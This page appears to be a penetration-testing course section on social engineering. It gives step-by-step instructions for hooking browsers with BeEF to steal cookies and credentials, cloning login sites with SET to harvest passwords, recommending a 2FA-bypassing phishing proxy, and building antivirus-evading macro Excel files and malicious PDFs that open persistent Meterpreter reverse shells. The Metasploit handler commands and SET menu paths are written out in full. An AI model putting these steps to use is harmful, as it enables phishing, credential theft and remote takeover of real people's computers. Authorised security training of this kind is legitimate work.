---
layout: default
title: "Practical Security Assessment (Penetration Testing) - Social Engineering"
permalink: "/pentest/01-Social-Engineering/"
---

<div class="lead">
<h2 id="beef-web-exploitation-framework">BeEF - Web Exploitation Framework</h2>
<h3 id="starting-beef">Starting BeEF</h3>
<pre><code class="language-sh">$ beef-xss</code></pre>
<p><img class="img-responsive" src="/pentest/img/beef1.JPG" alt="Starting up BeEF" title="Starting up BeEF"></p>
<p>As you can see in the image, to connect to the BeEF, open the following link in your browser: <a href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a></p>
<p>Username/pass: beef/beef</p>
<p>BeEF provides you with a Javascript hook that you make your target to load, one way or the other. When
    your target&apos;s browser loads this hook, it automatically connects back to your server and allows
    you to basically do almost anything you want within the browser: steal cookies, show the victim any pop
    window that could help you gain credentials, redirect the victim to somewhere you want, etc. The hook
    is located at <a href="http://your_IP_address:3000/hook.js">http://your_IP_address:3000/hook.js</a></p>
<p><img class="img-responsive"src="/pentest/img/beef2.JPG" alt="BeEF Hook" title="BeEF Hook"></p>
<p>If the victim navigates to a website where this Javascript is loaded, nothing can stop you from gaining
    some juicy info from the victim. So, when the victim opens that kind of page, you will see a new
    connection in your BeEF website:</p>
<p><img class="img-responsive"src="/pentest/img/beef3.JPG" alt="BeEF Attack" title="BeEF Attack"></p>
<p>There are a lot of attacks you can perform. Especially check out social engineering ones.</p>
<p><img class="img-responsive"src="/pentest/img/beef4.JPG" alt="BeEF Social Engineering" title="BeEF Social Engineering"></p>
<p>Show the user &quot;Facebook&quot; pop up window:</p>
<p><img class="img-responsive"src="/pentest/img/beef5.JPG" alt="BeEF Pretty Theft" title="BeEF Pretty Theft"></p>
<p><img class="img-responsive"src="/pentest/img/beef6.JPG" alt="BeEF Facebook Pop-up" title="BeEF Facebook Pop-up"></p>
<p>Get the credentials:</p>
<p><img class="img-responsive"src="/pentest/img/beef7.JPG" alt="BeEF Credentials Extraction" title="BeEF Credentials Extraction"></p>
<h3 id="pass-the-cookie">Pass the Cookie</h3>
<p>If you own the cookies of a user, you can actually pass them as if you are that user. Check it out <a
        href="https://wunderwuzzi23.github.io/blog/passthecookie.html#CheatSheet">here</a>.</p>
<h2 id="phishing">Phishing</h2>
<p>The best phishing tool I have seen is <a href="https://github.com/drk1wi/Modlishka">Modlishka</a>. It
    works as a proxy server. You set it up on your server with a domain name of your own. If a user
    browsers this domain name, the user will see a page that not only looks identical to the real one but
    also shows 2-factor authentication requests and can redirect to the real website. Really, really
    powerful.</p>
<p>Some other common tools for managing phishing campaigns:</p>
<ul>
    <li><a href="https://www.phishingfrenzy.com/">Phishing Frenzy</a></li>
    <li><a href="https://getgophish.com/">Gophish</a></li>
</ul>
<h2 id="social-engineering-toolkit-set-clone-website">Social Engineering Toolkit (SET) - Clone Website</h2>
<p>Run the following command:</p>
<pre><code class="language-sh">$ setoolkit</code></pre>
<p>You will see SET menu. To clone a website and harvest credentials from a legit looking site, select the
    following:</p>
<ol>
    <li>Social-Engineering Attacks</li>
    <li>Website Attack Vectors</li>
    <li>Credential Harvester Attack Method</li>
    <li>Site Cloner</li>
</ol>
<p>Next, you will be asked to set up the IP address of your machine where you will host this cloned website
    with the login page. By default, it should already show your IP address (most probably, it will be your
    local IP address). Afterwards, you will be asked to enter the URL to clone.</p>
<p>Wait some time and when it is all set and done, the cloned website will appear in /var/www/
    The your victims type something into those fields, you will find their data/credentials in the file
    called harvester within the same folder /var/www/.</p>
<h2 id="malicious-microsoft-office-payloads">Malicious Microsoft Office Payloads</h2>
<p>The best way to avoid AV is to make your payload in Word or Excle through VBA/VBS manually (and wrapping
    it all up with .hta file). However, there are definitely tools out there that can help you out with
    that. For example, <a href="https://raw.githubusercontent.com/enigma0x3/Generate-Macro/master/Generate-Macro.ps1">Generate-Macro.ps1</a></p>
<p>To start the process, run powershell from the command line prompt:</p>
<pre><code class="language-sh">powershell -exec bypass</code></pre>
<p>Afterwards, locate the downloaded Generate-Macro.ps1 file and run it:</p>
<pre><code class="language-sh">\.Generate-Macro.ps1</code></pre>
<p>Enter your IP address (local), port number 443, and the name of the document without the file extension.
    Then, select the attack method (1, Meterpreter Shell with Login Persistence) and Payload (1,
    Meterpreter Reverse HTTPS). The file will be saved in the same folder with .xls extension.</p>
<p>This is basically the file, which when opened, will connect back to your server and provide full command
    line access if the victim enables the Macro when prompted to do so. Therefore, you need to run a
    meterpreter HTTPS listener (your server that will listen for the victims connections). To do that, we
    will use a standard Meterpreter Handler from Metasploit Framework in Kali:</p>
<pre><code class="language-sh">$ msfconsole
msf&gt; use exploit/multi/handler
msf&gt; set PAYLOAD windows/meterpreter/reverse_https
msf&gt; set ExitOnSession false
msf&gt; set LHOST your_IP_address
msf&gt; set LPORT 443
msf&gt; exploit -j</code></pre>
<p>This script also creates a persistent VBS script, launching it at startup, which means that it will
    auto-connect to your machine even when the victim reboots it.</p>
<h2 id="malicious-pdf-from-set">Malicious PDF from SET</h2>
<p>Run Social Engineering Toolkit in Kali.</p>
<pre><code class="language-sh">$ setoolkit</code></pre>
<p>Select the following options from the menu:
    (1) Social-Engineering Attacks
    (3) Infection Media Generator
    (1) File-Format Exploits</p>
<p>Enter your IP address. Then:</p>
<p>(13) Adobe PDF Embedded EXE Social Engineering
    (2) Use built-in BLANK PDF (or you can create your own PDF and use that one, most fun!)
    (2) Windows Meterpreter Reverse_TCP</p>
<p>Default LHOST is good to go, it should be your IP address.
    Default PORT is good to go as well.</p>
<p>Let SET create a listener right now (yes). The listener will be similar to the one that we created in
    the Malicious Microsoft Office Payloads except the line with setting the PAYLOAD and PORT (will be the
    same as was set by default in this section):</p>
<pre><code class="language-sh">msf&gt; set PAYLOAD windows/meterpreter/reverse_tcp
msf&gt; set LPORT the_port_that_was_set_by_default</code></pre>
</div>
